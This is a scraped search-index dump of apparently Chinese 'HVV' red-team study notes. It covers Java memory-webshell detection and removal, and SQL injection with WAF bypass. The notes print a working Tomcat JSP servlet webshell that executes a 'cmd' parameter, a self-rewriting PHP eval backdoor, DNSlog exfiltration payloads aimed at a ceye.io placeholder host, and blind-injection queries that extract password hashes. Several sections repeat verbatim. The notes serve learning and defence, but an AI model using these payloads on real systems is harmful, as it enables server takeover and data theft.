","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马判断"},{"categories":["hvv"],"content":"\r内存马的查杀\r内存马判断先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。 通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。 利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀 清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 ","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#清除内存马中的filter的恶意代码"},{"categories":["hvv"],"content":"\r内存马的查杀\r内存马判断先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。 通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。 利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀 清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 ","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#模拟中间件注销filter"},{"categories":["hvv"],"content":"\r0x0 基础知识","date":"2023-11-17","objectID":"/hvv_java/:1:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x0-基础知识"},{"categories":["hvv"],"content":"\rServletServlet是运行在web服务器或应用服务器上的程序，它是作为来自HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。 1.请求的处理过程 客户端发起一个http请求，比如get类型。 Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。 Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。 Servlet容器调用service()方法。 service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。 doXXX方法中是我们自己写的业务逻辑。 业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。 容器关闭时候，会调用destory方法。 2.servlet生命周期 1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(SerlvetConfig conf)。 2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行 3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。 4）由JVM进行垃圾回收。 ","date":"2023-11-17","objectID":"/hvv_java/:1:1","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#servlet"},{"categories":["hvv"],"content":"\rFilterfilter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。 ","date":"2023-11-17","objectID":"/hvv_java/:1:2","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter"},{"categories":["hvv"],"content":"\rListenerJavaWeb开发中的监听器(Listener)就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行的功能组件。 **ServletContextListener：**对Servlet上下文的创建和销毁进行监听； **ServletContextAttributeListener：**监听Servlet上下文属性的添加、删除和替换； **HttpSessionListener：**对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。 **HttpSessionAttributeListener：**对Session对象中属性的添加、删除和替换进行监听； **ServletRequestListener：**对请求对象的初始化和销毁进行监听； **ServletRequestAttributeListener：**对请求对象属性的添加、删除和替换进行监听。 用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。 ","date":"2023-11-17","objectID":"/hvv_java/:1:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#listener"},{"categories":["hvv"],"content":"\rTomcat简单理解，tomcat是http服务器+servlet容器。 Tomcat作为Servlet容器，将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将相应的信息封装为HttpServletRequesponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。 ","date":"2023-11-17","objectID":"/hvv_java/:1:4","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#tomcat"},{"categories":["hvv"],"content":"\r0x1 webshell变迁web服务端管理页面→大马→小马拉大马→一句话木马→加密一句话木马→加密内存马 ","date":"2023-11-17","objectID":"/hvv_java/:2:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x1-webshell变迁"},{"categories":["hvv"],"content":"\r0x2 如何实现webshell内存马**目标：**访问任意url或者url，带上命令执行参数，即可让服务器返回命令执行结果。 **实现：**以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。 ","date":"2023-11-17","objectID":"/hvv_java/:3:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x2-如何实现webshell内存马"},{"categories":["hvv"],"content":"\r0x3 内存马攻击原理通过动态注册一个新的Filter或者向Filter中注入恶意的shellcode，让Filter允许攻击者访问到web服务器内存中的数据。主要拥有了可用的Filter，攻击者就能进行远程攻击，而不管是shellcode的注入过程还是对web服务器数据进行访问的过程都会在内存中出现异常行为。另外，由于web服务器在网络中与数据库和权限系统连接，攻击者在入侵后，可以更轻易地进行横向的渗透，拿到多个主机的权限。 ","date":"2023-11-17","objectID":"/hvv_java/:4:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x3-内存马攻击原理"},{"categories":["hvv"],"content":"\r0x4 内存马实现这里是以tomcat的servletAPI型内存马为例讲一下内存马的实现。 下面代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到Standard Context当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。 \u003c%@ page import=\"java.ip.IOException\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.io.printWriter\" %\u003e \u003c% // 创建恶意Servlet Servlet servlet = new Servlet() { @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest,ServletResponse servletResponse) throws ServletException,IOException{ String cmd = servletRequest.getParameter(\"cmd\"); boolean is Linux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\",\"-c\",cmd} : new String[]{\"cmd.exe\",\"/c\",cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\a\"); String output = s.hasNext() ? s.next() : \"\"; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } @Override public String getServletInfo() { return null; } @Override public void destroy() { } }; %\u003e \u003c% // 获取StandardContext org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase)Thread.currentThread().getContextClassLoader(); StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext(); // 用Wrapper对其进行封装 org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper(); newWrapper.setName(\"jweny\"); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); // 添加封装后的恶意Wrapper到StandardContext的children当中 standardCtx.addChild(newWrapper); // 添加ServletMapping将访问的URL和Servlet进行绑定 standardCtx.addServletMapping(\"/shell\",\"jweny\"); %\u003e 执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。 ","date":"2023-11-17","objectID":"/hvv_java/:5:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x4-内存马实现"},{"categories":["hvv"],"content":"\r0x5 内存马查杀**方法一：**清除内存马中的Filter的恶意代码。这种方式相对通用简单一些，直接适配所有中间件。 **方法二：**模拟中间件注销Filter。这种方式相对要复杂一些，因为每种中间件注销Filter的逻辑不尽相同，需要一一适配。 ","date":"2023-11-17","objectID":"/hvv_java/:6:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x5-内存马查杀"},{"categories":["hvv"],"content":"\r0x6 内存马实例 \u003c?php set_time_limit(0); //set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0，没有时间方面的限制。 ignore_user_abort(1); //ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开。 unlink(__FILE__); //unlink(__FILE__)函数：删除文件。 while(1){ $content = '\u003c?php @eval($_POST[\"geek\"])?\u003e'; file_put_contents(\"22.php\",$content); //file_put_contents函数：将一个字符串写入文件。 usleep(10000); //usleep函数：延迟执行当前脚本若干微妙 } ?\u003e 将php不死马放到web目录下， 访问代码执行成功生成后门 对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。使用条件竞争写入同名文件进行克制不死马。 将usleep改为小于php不死马的参数，查看22.php已修改成叹号。 参考资料： 黑客攻击之道—内存马 ","date":"2023-11-17","objectID":"/hvv_java/:7:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x6-内存马实例"},{"categories":["hvv"],"content":"HVV专题–OWASP TOP10漏洞 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#"},{"categories":["hvv"],"content":"\rTOP10漏洞 1、SQL注入 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#top10漏洞"},{"categories":["hvv"],"content":"\r常见web漏洞","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#常见web漏洞"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#01-sql注入漏洞"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from 